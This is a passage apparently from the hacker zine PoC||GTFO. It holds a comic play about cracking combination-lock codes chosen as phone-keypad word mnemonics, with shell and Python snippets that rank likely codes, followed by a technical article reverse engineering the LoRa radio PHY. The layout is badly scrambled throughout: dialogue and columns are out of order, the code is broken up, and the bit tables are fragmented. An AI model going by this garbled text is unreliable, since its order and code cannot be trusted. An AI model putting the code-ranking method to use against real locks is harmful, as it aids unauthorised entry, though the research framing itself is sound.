be approved to work on a real project.
Havva: What are you doing?
Alice: Did you ever notice that the numbers
zero and one don’t have any letters on the
phone?
Alice: [On her desk phone] Yes. Yes, no prob-
lem. By close of business today. No problem.
Bye.
Havva: Sure! You’re probably too young to
have ever used a rotary phone, right? Back
when phone numbers were only seven dig-
its long, the first two numbers represented
the exchange, and a mnemonic was given
to each exchange. [Singing and tapping on
her desk ] Bum-dah-bum bah-duh-bum bahhh
dummm! PEnnsylvania Six Five Thousand!
No? It was a big Glenn Miller hit! My par-
ents used to play it all the time when I was a
kid. That song is referring to the phone num-
ber for the Hotel Pennsylvania in New York,
which to this day is still (212) PE6-5000.
Pastor: As Alice hangs up the phone, she no-
tices something odd about the keypad, and
immediately remembers the magnet Bob had
showed her.
Alice: [Gets up and starts drawing on her
whiteboard.]
1 2
abc 3
def
4
ghi 5
jkl 6
mno
7
pqrs 8
tuv 9
wxyz
Alice: Oh yeah! I went there once for HOPE.
Havva: Hope? Anyhow, for various reasons,
the numbers zero and one were never used in
exchanges, which meant they never occurred
at the beginning of phone numbers, which
meant they couldn’t have letters associated
with them.
0
44DO
36
EN
36
FO
36
FO
36
Alice: Interesting! [Continuing on the white-
board ] 8 6 = . . . [a pause to consult her com-
puter ] 262144. 1 − 262144 ÷ 1000000 =
. . . 0.738. Wow! So, if there are only eight
buttons with letters, that reduces the number
of possible phone numbers associated with six-
letter mnemonics by 74% compared to if all the
buttons had letters!
Havva: I guess that’s true. There are also cer-
tain phone numbers you’ll never be able to
have English mnemonics for, because the but-
tons for 5, 7, and 9 don’t have any vowels. So
you can’t make a mnemonic for a phone num-
ber that only uses those three numbers.
SA
72
RA
72
RA
72
RB
72
GE
43
GE
43
GE
43
ID
43
Pastor: And many words share the same code.
In fact, Alice quickly wrote a script to count
the number of unique codes possible from six-
letter English words 17 .
Alice: There are only 14684 possible codes to
check! That would take . . . only about 40 days
to brute-force crack!
6
Alice: Wow, yeah, that’s another 3 = . . .
[quickly doing some math in her head this
time] 729 codes that don’t have mnemonics.
Act III: The Book
Havva: Codes?
Pastor: Later that day, Alice is at her favorite
dive, decompressing with some of her side
projects.
Alice: Er, I mean “phone numbers.”
Havva: I’ll bet there are certain “codes” that
don’t have any English words associated with
them. Plus, letters in English words don’t all
occur at the same frequency: It’s much more
likely that a word will have the letter “e” than
it will have the letter “x.”
Paul: [Sits down next to Alice at the bar. Wheel
of Fortune is playing on an ancient CRT.]
Television is something the Russians invented
to destroy American education.
Alice: [Opens up a terminal on her computer.]
Alice: [Tippling a brown liquor, neat, while
working on her laptop. Paul’s comment draws
her attention to the TV. Alice notices that
some letters are given away “for free” and re-
members what Havva had said about letter fre-
quency. She quickly grabs her notebook and
jots down the letters as a reminder.] R, S, T,
L, N, E.
$ grep ’^.\{6\}$’ /usr/share/dict/words | wc -l
17706
$ echo `!!` / 1000000 | bc -l
.01770600000000000000
Pastor: And thus, Alice had discovered that
fewer than 2% of the million possible codes
actually map to English words.
Alice: [Once again at the whiteboard.]
HA
42
CK
25
Paul: [Noticing Alice’s notebook.] Yes, these
are very common letters in English. My native
language does not use “r” as much. But what
do I know about English? I learned it from
my father, who taught it to himself by reading
English novels in one of Joe’s Gulags. [Awk-
ward pause while Alice struggles with how to
respond.] Have you discovered anything beau-
tiful? [Pointing into her notebook.]
ER
34
[Back at the computer.]
$ grep -i ’^.\{4\}er$’ /usr/share/dict/words \
| wc -l
1562
About 10% of six-letter English words end
with the letters “ER”!
Alice: Oh that? I’ve been thinking about
mnemonics for passcodes.
[Back at the board, with long pauses.]
17 $ grep ’^.\{6\}$’ /usr/share/dict/words | tr ’[:upper:]’ ’[:lower:]’ | sed ’s/[abc]/2/g; s/[def]/3/g;
s/[ghi]/4/g; s/[jkl]/5/g; s/[mno]/6/g; s/[pqrs]/7/g; s/[tuv]/8/g; s/[wxyz]/9/g’ | sort | uniq | wc -l
45Paul: [Pointing to the drink:] That poison will
not help you. [Produces a small pill bottle out
of his shirt pocket, raises it to eye level, drops
it, and then catches it with the same hand be-
fore it hits the bar.]
Paul: SF means “Supreme Fascist.” This would
show that God is bad. I do not claim that
this is correct, or that God exists. It is just a
sort of half-joke. There is an anecdote I once
heard. Suppose Israel Gelfand and his advisor,
Andrei Kolmogorov, were to both arrive in a
country with a lot of mountains. Kolmogorov
would immediately try and climb the highest
mountain. Gelfand would immediately start
building roads. What would you do?
Alice: Haven’t you heard? The Ballmer Peak
is real! Or at least that’s what I read on Stack
Exchange.
Paul: Pál Erdős. My brain is open.
Pastor: Alice introduces herself and proceeds
to explain all of her findings to Paul. Alice: I would learn to fly an airplane so I could
discover new mountain ranges. What about
you?
Alice: . . .and I just finished sorting the 14684
distinct codes by the number of words associ-
ated with them. That way, if I try the codes
in order of decreasing word associations, then
it will maximize my chances of cracking the
code sooner than later. Paul: Some might say that is what I do. My
friends might add that they pay for the fuel.
But really, I just try to keep the SF’s score
low. How can we create mnemonics that are
not vulnerable to your attack?
Alice: Well, I guess the first thing to do is cre-
ate a keypad layout that uses zero and one.
Paul: Yes, if codewords are chosen uniformly
from all six-letter English words. Can I see
the distribution of word frequency? [Grabbing
a napkin, stealing Alice’s pen, and scribbling
some notes.] Using your method, after fewer
than 250 attempts, there is a 5% probability
that you will have cracked the code. After
about 5700 attempts, there will be a 50% prob-
ability of success.
Paul: Yes, but my academic sibling Pólya
would say that we first need to understand
the problem. Ideally, we want a keypad lay-
out that produces an injective mapping from
the six-letter English words into the natural
numbers from zero to one million.
Alice: Injective?
Alice: [Typing on her computer.] That’s only
about 16 days!
Paul: Such that no two words produce the same
code number.
Pastor: An adversary with intermittent access
to the lock—for example, after hours—could
quite conceivably crack the code in less than a
month.
Alice: Is that even possible?
Paul: I do not know. I believe this is an in-
stance of the multiple subset sum problem, re-
lated to the knapsack problem.
Paul: If there exists a method that allows the
code-breaker to detect whether each succes-
sive two-digit subcode is correct before enter-
ing the next two-digit subcode,. . .
Alice: Ah yeah, I remember that from my al-
gorithms class. It’s NP-Complete, right?
Pastor: . . .otherwise known as a “vulnerability”. . .
Paul: . . .[annoyed about having been inter-
rupted, even if by the disembodied voice of
a narrator ] then the expected value for the
length of time required to crack the code is on
the order of minutes. [Mumbling toward the
fourth wall:] That Pastor is more annoying
than the SF.
Paul: Yes, and likely intractable for problems
even as small as this one. The total number
of possible keypad mappings is 100 million bil-
lion billion. But it is easy for us to check the
pigeons.
Alice: Huh?
Paul: The pigeonhole principle. For any subset
of m letters within a word, there can be at
most 10 6−m words that have that pattern of
Alice: What?
46letters. If there are more, then there must be
a collision, no matter the mapping we choose. Paul: The Book in which the SF keeps all of the
most beautiful solutions.
Alice: Ah, I see. That’s easy enough to check!
[Typing.] Alice: Well, I think I’ll try my hand at a scruffy
genetic algorithm. I need a decent mapping if
I ever want to publish this in PoCkGTFO!
1 f o r m in range ( 2 , 6 ) :
h i t s = {}
3
f o r word in words :
f o r i n d e x e s in i t e r t o o l s .
c o m b i n a t i o n s ( range ( len ( word ) ) , m) :
5
key = tuple ( ( word [ i ] , i )
f o r i in i n d e x e s )
i f key not in h i t s :
7
h i t s [ key ] = 1
else :
9
h i t s [ key ] += 1
max_hits = 10∗∗(6 −m)
11
f o r key , h in h i t s . i t e r i t e m s ( ) :
i f h <= max_hits :
13
continue
k = [ ’ . ’ f o r i in range ( 6 ) ]
15
f o r c , i in key :
k[ i ] = c
17
print " " . j o i n ( k ) , h − max_hits
Paul: What is PoCkGTFO?
Alice: It’s. . . I guess it’s a sort of bible.
Paul: Then the only difference between your
Book and mine are the fascists who created
them. Maybe we will continue tomorrow . . . if
I live.
Alice: [Looking up from her keyboard.] Can I
buy you a drink? [Paul has vanished.]
Pastor: The moral of the story, dear neighbors,
is not that these locks are inherently vulnera-
ble; if used properly, they are in fact incredibly
secure. We must remember that these locks
are only as secure as the codes humans choose
to assign to them. Using a phone keypad map-
ping on six-letter English dictionary words is
the physical security equivalent of a website
arbitrarily limiting passwords to eight charac-
ters.
So, there are fourteen five-letter suffixes like
“inder”, “aggle”, and “ingle” that will all pro-
duce at least one collision. I guess there’s no
way to make a perfect mapping.
!
PoC k GTFO
1
2
3
avwz
bex
cl
5
fn 6
gs
7
ip 8
jmuy 9
kr
Memorize,
Don’t
Compromise 0
ot Самиздат
4
dhq
Alice: That sounds . . . difficult.
!
Paul: Constructing expander graphs is ex-
tremely difficult. But I think Szemerédi would
agree that interesting things rarely happen in
fewer than five dimensions.
Alice: I am a pragmatist. How about we use
a genetic algorithm to evolve a near optimal
mapping?
Paul: Such a solution would not be from The
Book, but it would provide you with a map-
ping.
Alice: What book?
47
Paul: Gelfand advised Endre Szemerédi. This
problem is reminiscent of Szemerédi’s use of
expander graphs in pseudo-random number
generation. What we want to do is take a rel-
atively small set of inputs (being the six-letter
English words) and use an expander graph as
an embedding into the natural numbers be-
tween one and a million, such that the result-
ing distribution mimics uniformity.7
Reverse Engineering the LoRa PHY
by Matt Knight
It’s 2016, and everyone’s favorite inescapable buz-
zword is IoT, or the “Internet of Things.” The mere
mention of this phrase draws myriad reactions, de-
pending on who you ask. A marketing manager
may wax philosophical about swarms of connected
cars eradicating gridlock forever, or the inevitability
of connected rat traps intelligently coordinating to
eradicate vermin from midtown Manhattan, 18 while
a security researcher may just grin and relish in the
plethora of low-power stacks and new attack surfaces
being applied to cyber-physical applications.
IoT is marketing speak for connected embedded
devices. That is, inexpensive, low power, resource
constrained computers that talk to each other, possi-
bly on the capital-I Internet, to exchange data and
command and control information. These devices
are often installed in hard to reach places and can
be expected to operate for years. Thus, easy to con-
figure communication interfaces and extreme power
efficiency are crucial design requirements. While 2G
cellular has been a popular mechanism for connect-
ing devices in scenarios where a PAN or wired tech-
nology will not cut it, AT&T’s plans to sunset 2G
on January 1, 2017 and LTE-M Rel 13’s distance
to widespread adoption presents an opportunity for
new wireless specifications to seize market share.
LoRa is one such nascent wireless technology
that is poised to capture this opportunity. It is a
Low Power Wide Area Network (LPWAN), a class of
wireless communication technology designed to con-
nect low power embedded devices over long ranges.
LoRa implements a proprietary PHY layer; there-
fore the details of its modulation are not published.
This paper presents a comprehensive blind sig-
nal analysis and resulting details of LoRa’s PHY,
chronicles the process and pitfalls encountered along
the way, and aspires to offer insight that may assist
security researchers as they approach their future
unknowns.
7.1
Casing the Job
I first heard of LoRa in December 2015, when it
and other LPWANs came up in conversation among
neighbors. Collectively we were intrigued by its ad-
vertised performance and unusual modulation, thus
I was motivated to track it down and learn more.
In the following weeks, I occasionally scanned the
900 MHz ISM spectrum for signs of its distinctive
waveform (more on that soon), however searches in
the New York metropolitan area, Boston, and a col-
league’s search in San Francisco yielded no results.
Sometime later I found myself at an IoT security
meetup in Cambridge, MA that featured representa-
tives from Senet and SIGFOX, two major LPWAN
players. Senet’s foray into LoRa started when they
sought to remotely monitor fluid levels in home heat-
ing oil tank measurement sensors to improve the ex-
isting process of sending a guy in a truck to read it
manually. Senet soon realized that the value of this
infrastructure extended far beyond the heating oil
market and has expanded their scope to becoming
a IoT cellular data carrier of sorts. While following
up on the company I happened upon one of their
marketing videos online. A brief segment featured a
grainy shot of a coverage map, which revealed just
enough to suggest the presence of active infrastruc-
ture in Portsmouth, NH. After quick drive with my
Ettus B210 Software Defined Radio, I had my first
LoRa captures.
7.2
First Observations and OSINT
LoRa’s proprietary PHY uses a unique chirp spread
spectrum (CSS) modulation scheme, which encodes
information into RF features called chirps. A chirp
18 LoRaWan
in the IoT Industrial Panel, presentation by Jun Wen of Cisco.
48Figure 11. Spectrogram of a LoRa packet.
Third, a European patent filing from Semtech
described a CSS modulation that could very well be
LoRa.
Finally, neighbors who came before me had
produced open-source prior art in the form of
a partial rtl-sdrangelove implementation and
a wiki page, 20 however in my experience the
rtl-sdrangelove attempt was piecemeal and ne-
glected and the wiki contained only high level ob-
servations. These were not enough to decode the
packets that I had captured in New Hampshire.
is a signal whose frequency is increasing or decreas-
ing at a constant rate, and they are unmistakable
within the waterfall. A chirp-based PHY is shown
in Figure 11.
Contrasted with FSK or OFDM, two common
PHYs, the differences are immediately apparent.
Modulation aside, visually inspecting a spectro-
gram of LoRa’s distinct chirps reveals a PHY struc-
ture that is similar to essentially all other digital
radio systems: the preamble, start of frame delim-
iter, and then the data or payload.
Since LoRa’s PHY is proprietary, no PHY layer
specifications or reference materials were available.
However, thorough analysis of open source and read-
ily available documentation can greatly abbreviate
reverse engineering processes. When I conducted
this investigation, a number of useful documents
were available.
First, the Layer 2+ LoRaWAN stack is pub-
lished, containing clues about the PHY.
Second, several application notes were available
for Semtech’s commercial LoRa modules. 19 These
were not specs, but they did reference some PHY-
layer components and definitions.
19 Semtech
7.3
Demodulation
OSINT gathering revealed a number of key defi-
nitions that informed the reverse engineering pro-
cess. A crucial notion is that of the spreading fac-
tor (SF): the spreading factor represents the num-
ber of bits packed into each symbol. A symbol,
for the unordained, is a discrete RF energy state
that represents some quantity of modulated infor-
mation (more on this later.) The LoRaWAN spec
revealed that the chirp bandwidth, that is the width
of the channel that the chirps traverse, is 125 kHz,
AN1200.18, AN1200.22.
LoRa on the RevSpace Wiki
20 Decoding
49250 kHz, or 500 kHz within American deployments.
The chirp rate, which is intuitively the first deriva-
tive of the signal’s frequency, is a function of the
spreading factor and the bandwidth: it is defined as
bandwidth/2 ( spreading_factor ) . Additionally, the
absolute value of the downchirp rate is the same as
the upchirp rate. 21
Back to the crucial concept of symbols. In LoRa,
symbols are modulated onto chirps by changing the
instantaneous frequency of the signal – the first
derivative of the frequency, the chirp rate, remains
constant, while the signal itself “jumps” through-
out its channel to represent data. The best way
to intuitively think of this is that the modulation
is frequency-modulating an underlying chirp. This
is analogous to the signal alternating between two
frequencies in a 2FSK system, where one frequency
represents a 0 and the other represents a 1. The
underlying signal in that case is a signal of constant
frequency, rather than a chirp, and the number of
bits per symbol is 1. How many data bits are en-
coded into each frequency jump within LoRa? This
is determined by the spreading factor.
The first step to extracting the symbols is to de-
chirp the received signal. This is done by channeliz-
ing the received signal to the chirp’s bandwidth and
multiplying the result against a locally-generated
complex conjugate of whichever chirp is being ex-
tracted.
A locally generated chirp might look like this.
Since both upchirps and downchirps are present
in the modulation, the signal should be multiplied
against both a local upchirp and downchirp, which
produces two separate IQ streams. Why this works
can be reasoned intuitively, since waves obey su-
perposition, multiplying a signal with frequency f 0
against a signal with frequency −f 0 results in a sig-
nal with frequency 0, or DC. If a chirp is multiplied
against a copy of itself, it will result in a signal of
2 ∗ f 0, which will spread its energy throughout the
band. Thus, generating a local chirp at the nega-
tive chirp rate of whichever chirp is being processed
21 See
Semtech AN1200.22.
50results in RF features with constant frequency that
can be handled nicely.
In following examples, the left image shows de-
chirped upchirps while the right shows de-chirped
downchirps:
With the signal de-chirped, the remainder of
the demodulation process can be described in three
steps. These steps mimic the process required for
essentially all digital radio receivers.
First, we’ll identify the start of the packet by
finding a preamble. Then, we’ll synchronize with
the start of the packet, so that we may conclude in
demodulating the payload by measuring its aligned
symbols.
This de-chirped signal may be treated similarly
to MFSK, where the number of possible frequen-
cies is M = 2 ( spreading_factor ) . The Fast Fourier
Transform (FFT) is the tool used to perform the
actual symbol measurement. Fourier analysis shows
that a signal can be modeled as a summed series of
basic periodic functions (i.e., a sine wave) at various
frequencies. A FFT decomposes a signal into the fre-
quency components that comprise it, returning the
power and phase of each component present. Each
component to be extracted is colloquially called a
“bin;” the number of bins is specified as the “FFT
size” or “FFT width.”
7.3.1
Finding the Preamble
A preamble is a feature included in modulation
schemes to announce that a packet is soon to fol-
low. By visual inspection, we can infer that LoRa’s
preamble is represented by a series of continuous
upchirps. Once de-chirped and passed through an
FFT, all of the preamble’s symbols wind up resid-
ing within the same FFT bin. Thus, a preamble is
detected if enough consecutive FFTs have the same
argmax.
Thus, by taking an M -bin wide FFT of each IQ
stream, the symbols may be resolved by finding the
argmax, which is the bin with the most powerful
component of each FFT. This works out nicely be-
cause a de-chirped CSS symbol turns into a signal
with constant frequency; all of the symbol’s energy
should fall into a single bin. 22
7.3.2
Synchronizing with the SFD
With our receiver aware that it’s about to receive
a packet, the next step is to accurately synchronize
with it so that symbols can be resolved accurately.
To facilitate this, modern radio systems often adver-
tise the start of the packet’s data unit with a Start of
22 It may be possible to do this using FM demodulation rather than FFTs, however using FFTs preserves power information
that is useful for framing the packet without knowing its definitive length.
517.3.3
Frame Delimiter, or SFD, which is a known symbol
distinct from the preamble that receivers are pro-
grammed to look for. For LoRa, this is where the
downchirps come in.
The SFD is composed of two and one quarter
downchirps, while all the other symbols are repre-
sented by upchirps. With preamble having been
found, our receiver should look for two consecutive
downchirps to synchronize against. It looks some-
thing like the following:
Now synchronized against the SFD, we are able
to efficiently demodulate the symbols in the pay-
load by using the original non-overlapping FFT
method. However, since our receiver’s locally gen-
erated chirps are likely out of phase with the chirp
used by the transmitter, the symbols appear offset
within the set range [0 : 2 (spreading_factor) − 1] by
some constant. It was surmised that the preamble
would be a reliable element to represent symbol 0,
especially given that the aforementioned sync word’s
value is always referenced from the preamble. A sim-
ple modulo operation to normalize the symbol value
relative to the preamble’s zero-valued bin produces
the true value of the symbols, and the demodulation
process is complete.
7.4
Decoding, and its Pitfalls
Overall, demodulation proved to not be too difficult,
especially when you have someone like Balint See-
ber feeding you advice and sagely wisdom. However,
decoding is where the fun (and uncertainty) really
began.
First, why encode data? In order to increase
over the air resiliency, data is encoded before it is
sent. Thus, the received symbols must be decoded
in order to extract the data they represent.
The documentation I was able to gather on LoRa
certainly suggested that figuring out the decoding
would be a snap. The patent application describ-
ing a LoRa-like modulation described four decoding
steps that were likely present. Between the patent
and some of Semtech’s reference designs, there were
documented algorithms or detailed descriptions of
every step. However, these documents slowly proved
to be lies, and my optimism proved to be misplaced.
Accurate synchronization is crucial to properly
resolving symbols. If synchronization is off by
enough samples, when FFTs are taken each sym-
bol’s energy will be divided between two adjacent
FFTs. Until now, the FFT process used to resolve
the symbols processed 2 ( spreading_factor ) samples
per FFT with each sample being processed exactly
once, however after a few trial runs it became evi-
dent that this coarse synchronization would not be
sufficiently accurate to guarantee good fidelity.
Increasing the time-based FFT resolution was
found to be a reliable method for achieving an ac-
curate sync. This is done by shifting the stream of
de-chirped samples through the FFT input buffer,
processing each sample multiple times, to “overlap”
adjacent FFTs. This increases the time-based res-
olution of the FFT process at the expense of be-
ing more computationally intensive. Thus, overlap-
ping FFTs are only used to frame the SFD; non-
overlapped FFTs with each sample being processed
exactly once are taken otherwise to balance accuracy
and computational requirements.
Technically there’s also a sync word that pre-
cedes the SFD, but my demodulation process de-
scribed in this article does not rely on it.
23 European
Demodulating the Payload
7.4.1
OSINT Revisited
Perhaps the richest source of overall hints was
Semtech’s European patent application. 23
The
patent describes a CSS-based modulation with an
uncanny resemblance to LoRa, and goes so far as
to walk step-by-step through the encoding elements
present in the PHY. From the encoder’s perspec-
tive, the patent describes an encoding pipeline of
forward error correction, a diagonal interleaver, data
whitening, and gray indexing, followed by the just-
described modulation process. The reverse process
Patent #13154071.8/EP20130154071
52Figure 12. The top is pre-sync and non-overlapped, middle is pre-sync overlapped, bottom is synchronized
and non-overlapped.
53would be performed by the decoder. The patent
even defines an interleaver algorithm, and Semtech
documentation includes several candidate whitening
algorithms.
The first thing to try, of course, was to imple-
ment a decoder exactly as described in the docu-
mentation. This involved, in order:
shuffles bits within a block of a fixed size. The in-
terleaver is defined as: Symbol(j, (i + j)%PPM) =
Codeword(i, j) where 0 <= i < PPM, 0 <= j <
4 + RDD In this case, PPM is set to the spreading
factor (or spreading_f actor−2 for the PHY header
and when in low data rate modes), and RDD is set
to the number of parity bits used by the Forward
Error Correction scheme (ranging [1 : 4]).
There was only one candidate illustrated here,
so no iteration was necessary.
1. Undoing gray coding applied to the symbols.
2. Dewhitening using the algorithms defined in
Semtech’s documentation.
Forward Error Correction The Semtech patent
application suggests that Hamming FEC be used.
Other documentation appeared to confirm this. A
custom FEC decoder was implemented that orig-
inally just extracted the data bits from their stan-
dard positions within Hamming(8,4) codewords, but
early results were negative, so this was extended to
apply the parity bits to repair errors.
3. Deinterleaving using the algorithm defined in
Semtech’s patent.
4. Processing the Hamming forward error correc-
tion hinted at in Semtech’s documentation.
First, let’s review what we have learned about
each step listed above based on open-source re-
search, and what would be attempted as a result.
Using a Microchip RN2903 LoRa Mote, a transmit-
ter that was understood to be able to produce raw
frames, a known payload was sent and decoded us-
ing this process. However, the output that resulted
bore no resemblance to the expected payload. The
next step was to inspect and validate each of the
algorithms derived from documentation.
After validating each component, attempting ev-
ery permutation of supplied algorithms, and inspect-
ing the produced binary data, I concluded that
something in LoRa’s described encoding sequence
was not as advertised.
Gray Indexing Given the nomenclature ambigu-
ity in the Semtech patent, I also decided to test no
gray coding and reverse gray coding in addition to
forward gray coding. These were done using stan-
dard algorithms.
Data Whitening Data whitening was a colossal
question mark while looking at the system. An ideal
whitening algorithm is pseudorandom, thus an effec-
tive obfuscator for all following components of the
system. Luckily, Semtech appeared to have pub-
lished the algorithm candidates in Application Note
AN1200.18. Entitled “Implementing Data Whiten-
ing and CRC Calculation in Software on SX12xx
Devices,” it describes three different whitening algo-
rithms that were relevant to the Semtech SX12xx-
series wireless transceiver ICs, some of which sup-
port LoRa. The whitening document provided one
CCITT whitening sequences and two IBM methods
in C++. As with the gray indexing uncertainty, all
three were implemented and permuted.
7.5
Taking Nothing for Granted
The nature of analyzing systems like this is that
beneath a certain point they become a black box.
Data goes in, some math gets done, RF happens,
said math gets undone, and data comes out. Sim-
ple enough, but when encapsulated as a totality it
becomes difficult to isolate and chase down bugs in
each component. Thus, the place to start was at the
top.
Interleaver Interleaving refers to methods of de-
terministically scrambling bits within a packet. It
improves the effectiveness of Forward Error Correc-
tion, and will be elaborated on later in this text.
The Semtech patent application defined a diago-
nal interleaver as LoRa’s probable interleaver. It is
a block-style non-additive diagonal interleaver that
547.5.1
assumption because many block-based interleavers
are non-additive, and the interleaver defined in the
patent is non-additive as well. Even if the interleaver
used a different algorithm, such as a standard block
interleaver or a different type of diagonal interleaver,
it could still fit within this model.
Second, the forward error correction in use is
Hamming FEC, with 4 data bits and 1-4 parity bits
per codeword. FEC can be thought of as super-
charged parity bits. A single parity bit can indicate
the presence of an error, but if you use enough of
them they can collectively identify and correct er-
rors in place, without re-transmission. Hamming is
specifically called out by the European patent, and
the code rate parameter referenced throughout ref-
erence designs fits nicely within this model. The use
of Hamming codes, as opposed to some other FEC
or a cyclic coding scheme, was fortuitous because
of a property of the Hamming code words. Ham-
ming codeword mapping is deterministic based on
the nybble that is being encoded. Four bits of data
provide 16 possible codewords. When looking at
Hamming(8,4) (which is the inferred FEC for LoRa
code rate 4/8), 14 of the 16 codewords contain four
set bits (1s) and four unset bits (0s). However, the
code words for 0b0000 and 0b1111 are 0b00000000
and 0b11111111, respectively.
Thus, following on these two assumptions, if a
payload containing all 0x00s or 0xFFs were sent,
then the interleaving and forward error correction
should cancel out and not affect the output at all.
This reduces our unknown stages in the decoding
chain from four to just two, with the unknowns be-
ing gray indexing and whitening, and once those are
resolved then the remaining two can be solved for!
Since “gray indexing” likely refers to gray cod-
ing, reverse gray coding, or no coding should it be
omitted, this leaves only three permutations to try
while solving for the data whitening sequence.
The first step was to take a critical look at
the data whitening algorithms provided by Semtech
AN1200.18. Given the detail and granularity in
which they are described, plus the relevance of
having come straight from a LoRa transceiver
datasheet, it was almost a given that one of the three
algorithms would be the solution. With the inter-
leaver and FEC effectively zeroed out, and “gray in-
dexing” reduced to three possible states, it became
possible to test each of the whitening algorithms.
Testing each whitening algorithm was fairly
How to Bound a Problem
The Semtech patent describes the first stage of de-
coding as “gray indexing.” Gray coding is a process
that maps bits in such a way that makes it resilient
to off-by-one errors. Thus, if a symbol were to be
measured within ±1 index of the correct bin, the
gray coding would naturally correct the error. “Gray
indexing,” ambiguously referring to either gray cod-
ing or its inverse process, was initially understood
to mean forward gray coding.
The whitening sequence was next in line. Data
whitening is a process applied to transmitted data
to induce randomness into it. To whiten data, the
data is XORed against a pseudorandom string that
is known to both the transmitter and the receiver.
This does good things from an RF perspective, since
it induces lots of features and transitions for a re-
ceiver to perform clock recovery against. This is
functionally analogous to line coding schemes such
as Manchester encoding, but whitening offers one
pro and one con relative to line coding: data whiten-
ing does not impact the effective bit rate as Manch-
ester encoding does, 24 but this comes at the expense
of legibility due to the pseudorandom string.
At this point, it is important to address some of
the assumptions and inferences that were made to
frame the following approach. While the four de-
coding stages were thrown into question by virtue
of the fact that at least one of the well-described
algorithms was not correct, certain implied proper-
ties could be generalized for each class of algorithm,
even if the implementation did not match exactly.
I made a number of assumptions at this point,
which I’ll describe in turn.
First, the interleaver in use is non-additive. This
means that while it will reorder the bits within each
interleaving block, it will not cause any additional
bits to be set or unset. This was a reasonable
24 Manchester’s
effective bit rate is 1/2 baud rate.
55straightforward. A known payload of all 0x00s or
0xFFs (to cancel out interleaving and FEC) was
transmitted from the Microchip LoRa Technology
Mote and then decoded using each whitening al-
gorithm and each of the possible “gray indexing”
states. This resulted in 9 total permutations. A
visual diff of the decoded data versus the expected
payload resulted in no close matches. This was re-
placed with a diff script with a configurable toler-
ance for bits that did not match. This also resulted
in no matches as well. One final thought was to
forward compute the whitening algorithms in case
there was a static offset or seed warm-up, as can
be the case with other PRNG algorithms. Likewise,
this did not reveal any close matches. This meant
that either none of the given whitening algorithms
in the documentation were utilized, or the assump-
tions that I made about the interleaver and FEC
were not correct.
After writing off the provided whitening algo-
rithms as fiction, the next course of action was to
attempt to derive the real whitening algorithm from
the LoRa transmitter itself. This approach was
based on the previous observations about the FEC
and interleaver and a fundamental understanding of
how data whitening works. In essence, whitening is
as simple as XORing a payload against a static pseu-
dorandom string, with the same string used by both
the transmitter and receiver. Since anything XORed
with zero is itself, passing in a string of zeroes causes
the transmitter to reveal a “gray indexed” version of
its whitening sequence.
This payload was received, then transformed into
three different versions of itself: one gray-coded, one
unmodified, and one reverse gray-coded. All three
were then tested by transmitting a set of 0xF data
nybbles and using each of the three “gray indexing”
candidates and received whitening sequence to de-
code the payload. The gray coded and unmodified
versions proved to be incorrect, but the reverse gray
coding version successfully produced the transmit-
ted nybbles, and thus in one fell swoop, I was able
to both derive the whitening sequence and discern
that “gray indexing” actually referred to the reverse
gray coding operation. With “gray indexing” and
whitening solved, I could turn my attention to the
biggest challenge: the interleaver.
7.5.2
in the process. Following on this, the validity of the
interleaver definition provided in Semtech’s patent
was immediately called into question.
A quick test was conducted against a local im-
plementation of said interleaver: a payload com-
prised of a repeated data byte that would produce
a Hamming(8,4) codeword with four set and four
unset bits was transmitted and the de-interleaved
frame was inspected for signs of the expected code-
word. A few other iterations were attempted, in-
cluding reversing the diagonal offset mapping pat-
tern described by the patent and using the inverse
of the algorithm (i.e., interleaving the received pay-
load rather than de-interleaving it). Indeed, I was
able to conclude that the interleaver implemented by
the protocol is not the one suggested by the patent.
The next logical step is to attempt to reverse it.
Within a transmitter, interleaving is often ap-
plied after forward error correction in order to make
the packet more resilient to burst interference. In-
terleaving scrambles the FEC-encoded bits through-
out the packet so that if interference occurs it is
more likely to damage one bit from many codewords
rather than several bits from a single codeword. The
former error scenario would be recoverable through
FEC, the latter would result in unrecoverable data
corruption.
Block-based interleavers, like the one described
in the patent, are functionally straightforward.
The interleaver itself can be thought of as a two-
dimensional array, where each row is as wide as the
number of bits in each FEC codeword and the num-
ber of columns corresponds to the number of FEC
codewords in each interleaver block. The data is
then written in row-wise and read out column-wise;
thus the first output “codeword” is comprised of the
LSB (or MSB) of each FEC codeword. A diagonal
interleaver, as suggested in the patent, offsets the
column of the bit being read out as rows are tra-
versed.
Understanding the aforementioned fundamentals
of what the interleaver was likely doing was essen-
tial to approaching this challenge. Ultimately, given
that a row-column or row-diagonal relationship de-
fines most block-based interleavers, I anticipated
that patterns that could be revealed if approached
appropriately. Payloads were therefore constructed
to reveal the relationship of each row or codeword
with a corresponding diagonal or column. In order
to reveal said mapping, the Hamming(8,4) codeword
for 0xF was leveraged, since it would fill each row
The Interleaver
At this point we’ve resolved two of the four signal
processing stages, disproving their documentation
560x0000000F
00100011
00010011
00001001
00000111
00000000
00000100
01000011
10000101
0x000000F0
11000000
00100101
00010001
00001101
00001100
00000000
00000001
01000111
0x00000F00
00001001
00000111
00000011
00000011
01000010
10000001
00100001
00010000
0x0000F000
11010000
00001001
00000101
00000110
00001000
01000010
10000000
00100101
0x000F0000
00000011
00000011
01000001
10000010
00100010
00010001
00001001
00000000
0x00F00000
01000100
00000011
00000000
01000101
10001001
00100010
00010000
00001111
0x0F000000
01000001
10000010
00100001
00010010
00001010
00000111
00000011
00000101
0xF0000000
00001000
01000101
10000011
00100011
00010011
00001011
00000111
00000111
Figure 13. Symbol Tests
to reveal patterns. First, reverse the bit order of the
extracted codewords:
with eight contiguous bits at a time. Payloads con-
sisting of seven 0x0 codewords and one 0xF code-
word were generated, with the nybble position of
0xF iterating through the payload. See Figure 13.
As one can see, by visualizing the results as they
would be generated by the block, patterns associ-
ated with each codeword’s diagonal mapping can be
identified. The diagonals are arbitrarily offset from
the corresponding row/codeword position. One im-
portant oddity to note is that the most significant
bits of each diagonal are flipped.
While we now know how FEC codewords map
into block diagonals, we do not know where each
codeword starts and ends within the diagonals, or
how its bits are mapped. The next step is to map
the bit positions of each interleaver diagonal. This
is done by transmitting a known payload comprised
of FEC codewords with 4 set and 4 unset bits and
looking for patterns within the expected diagonal.
D
E
A
D
B
E
E
F
D
E
A
D
B
E
E
F
0
1
1
0
1
1
1
1
1
1
0
1
0
1
1
1
0
1
1
1
0
1
1
1
0
0
1
0
0
0
0
1
0
1
0
0
0
1
1
1
0
0
0
0
1
0
0
1
Bot
1
0
0
0
0
0
0
1
While no matches immediately leap off the page,
manipulating and shuffling through the data begins
0
1
0
0
0
1
1
1
0
0
1
0
0
0
0
1
0
1
1
1
0
1
1
1
1
1
0
